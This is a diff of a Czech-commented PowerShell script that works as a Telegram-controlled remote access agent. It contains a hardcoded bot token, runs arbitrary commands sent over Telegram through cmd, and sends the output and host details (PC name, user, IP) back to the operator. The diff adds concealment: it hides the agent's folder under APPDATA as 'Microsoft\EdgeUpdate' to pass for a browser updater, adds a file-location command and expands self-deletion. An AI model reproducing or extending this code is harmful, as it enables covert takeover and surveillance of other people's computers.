@@ -1,8 +1,19 @@
 
 $botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
-$stateFile = "C:\agent_state.txt"
-$logFile = "C:\agent_log.txt"
+
+$agentFolder = "$env:APPDATA\Microsoft\EdgeUpdate"
+$stateFile = "$agentFolder\state.dat"
+$logFile = "$agentFolder\log.dat"
+$agentScript = "$agentFolder\update.ps1"
+
 $chatId = $null
+
+# Vytvoř složku pokud neexistuje
+if(!(Test-Path $agentFolder)) {
+    New-Item -ItemType Directory -Path $agentFolder -Force | Out-Null
+    # Nastav atribut Hidden
+    (Get-Item $agentFolder -Force).Attributes = 'Hidden'
+}
 
 function Write-Log($msg) {
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -54,7 +65,6 @@ function Save-State {
 }
 
 function Clean-Text($text) {
-    # Odstranit všechny non-ASCII znaky a nahradit je '?'
     $text = $text -replace '[^\x00-\x7F]','?'
     return $text
 }
@@ -67,10 +77,7 @@ function Send-Message($text) {
     
     Write-Log "Odesilam zpravu do chatId=$chatId"
     
-    # Vyčisti text od problematických znaků
     $text = Clean-Text $text
-    
-    # Escape JSON znaky
     $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",''
     
     $json = "{`"chat_id`":`"$chatId`",`"text`":`"$text`"}"
@@ -132,7 +139,7 @@ while($true) {
                 }
                 Send-Message "[STATUS]`nPC: $pc`nUser: $user`nIP: $ip`nOnline"
             } elseif($cmd -eq '/help') {
-                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/log - Zobraz log`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
+                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/log - Zobraz log`n/files - Vypis soubory`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
             } elseif($cmd -eq '/log') {
                 if(Test-Path $logFile) {
                     $logContent = Get-Content $logFile -Encoding UTF8 | Select-Object -Last 30 | Out-String
@@ -143,27 +150,37 @@ while($true) {
                 } else {
                     Send-Message "Log soubor neexistuje"
                 }
+            } elseif($cmd -eq '/files') {
+                $info = "Umisteni souboru:`n"
+                $info += "Agent: $agentScript`n"
+                $info += "State: $stateFile`n"
+                $info += "Log: $logFile`n`n"
+                $info += "Slozka: $agentFolder"
+                Send-Message $info
             } elseif($cmd -eq '/kill') {
                 Write-Log "Ukoncuji se..."
                 Send-Message "Agent se ukoncuje..."
-                Remove-Item "C:\agent.ps1" -Force -ErrorAction SilentlyContinue
+                
+                # Smaž všechny soubory
+                Remove-Item $agentScript -Force -ErrorAction SilentlyContinue
                 Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                 Remove-Item $logFile -Force -ErrorAction SilentlyContinue
+                
+                # Smaž složku (pokud je prázdná)
+                Remove-Item $agentFolder -Force -ErrorAction SilentlyContinue
+                
                 exit
             } else {
                 Write-Log "Vykonavani prikazu: $cmd"
                 Send-Message "[EXECUTING] $cmd"
                 try {
-                    # Ulož výstup do dočasného souboru
                     $tempFile = [System.IO.Path]::GetTempFileName()
                     
-                    # Spusť příkaz a ulož do souboru
                     cmd /c "$cmd > `"$tempFile`" 2>&1"
                     $exitCode = $LASTEXITCODE
                     
                     Write-Log "Prikaz dokoncen s exit code: $exitCode"
                     
-                    # Načti soubor
                     if(Test-Path $tempFile) {
                         $output = Get-Content $tempFile -Raw -Encoding Default
                         Remove-Item $tempFile -Force
@@ -171,7 +188,6 @@ while($true) {
                         $output = ""
                     }
                     
-                    # Vyčisti output
                     $output = Clean-Text $output
                     $output = $output.Trim()
                     
